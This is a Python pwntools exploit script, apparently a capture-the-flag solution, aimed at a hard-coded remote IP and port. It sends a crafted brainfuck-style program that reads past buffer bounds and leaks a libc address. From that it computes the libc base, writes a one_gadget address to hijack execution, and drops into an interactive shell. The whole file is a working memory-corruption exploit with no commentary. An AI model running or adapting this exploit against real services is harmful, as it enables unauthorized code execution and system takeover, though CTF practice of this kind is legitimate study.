from pwn import *
import subprocess

context.log_level = 'debug'
r = remote('58.229.240.181', 7777)
#r = process(['python3', './main.py'])
libc = ELF('./libc.so.6')
go = lambda x: r.sendlineafter('>>> ', str(x))

p = '.[]'
p += '<' * (8)
p += '[,]'
p += '<' * (120)
p += '.'
p += '>.' * (0x20-1)
p += '>' * (0x10+1-8)
p += ',>' * 0x10
go(p)

sleep(2)
r.send('\x00')

r.recv()
libc_write = u64(r.recv()[8:8+8])
libc_base = libc_write - libc.symbols['write']
libc_close = libc_base + libc.symbols['close']

log.info('libc base : 0x%x' % libc_base)
one_gadgets = [324293, 324386, 1090444]
one_gadget = libc_base + one_gadgets[2] 

r.send(p64(one_gadget)+p64(libc_close))

p2 = '<,\x00'
go(p2)
sleep(2)

r.interactive()
